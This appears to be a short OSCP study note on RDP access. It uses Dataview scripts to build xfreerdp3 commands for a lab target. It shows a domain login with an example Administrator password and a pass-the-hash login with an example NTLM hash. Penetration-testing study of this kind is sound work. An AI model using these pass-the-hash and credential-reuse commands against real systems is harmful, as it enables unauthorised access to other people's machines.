RDP TCP/3389
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `xfreerdp3 /u:[USERNAME] /p:'[PASSWORD]' /v:${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Normal AD login
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `xfreerdp3 /u:${discoveredDomain}\\[USER] /p:[PWD] /v:${ip} /cert:ignore /dynamic-resolution +clipboard`;

dv.paragraph("```bash\n" + command + "\n```");
```
Example :
```
xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:resourced.local\\Administrator /p:ItachiUchiha888 /v:$IP
```

Pass the Hash
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `xfreerdp3 /u:${discoveredDomain}\\[USER] /pth:[HASH] /v:${ip} /cert:ignore /dynamic-resolution +clipboard`;

dv.paragraph("```bash\n" + command + "\n```");
```
Example : 
```
xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /u:resourced.local\\L.Livingstone /pth:19a3a7550ce8c505c2d46b5e39d6f808 /v:$IP
```

